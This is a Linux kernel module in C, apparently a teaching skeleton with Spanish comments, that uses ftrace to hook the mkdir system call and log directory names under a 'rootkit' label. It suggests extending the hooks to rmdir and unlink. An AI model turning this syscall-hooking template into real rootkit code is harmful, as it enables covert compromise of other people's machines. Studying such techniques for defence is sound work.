#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
//Muy probablemente haya que incluir más headers

#include "hooker.h"

//Cambiad esto a vuestro gusto
MODULE_LICENSE("GPL");
MODULE_AUTHOR("TretornESP");
MODULE_DESCRIPTION("Test Driver");
MODULE_VERSION("0.01");

//Este es el prototipo para la función original que se guardará
static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
//Esta es la función hookeada, que se llamará en lugar de la original
asmlinkage int hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);

    orig_mkdir(regs);
    return 0;
}

static struct ftrace_hook hooks[] = {
    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
    //Aqui podríamos añadir más hooks a otras funciones del kernel, por ejemplo sys_rmdir, sys_unlink, etc.
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);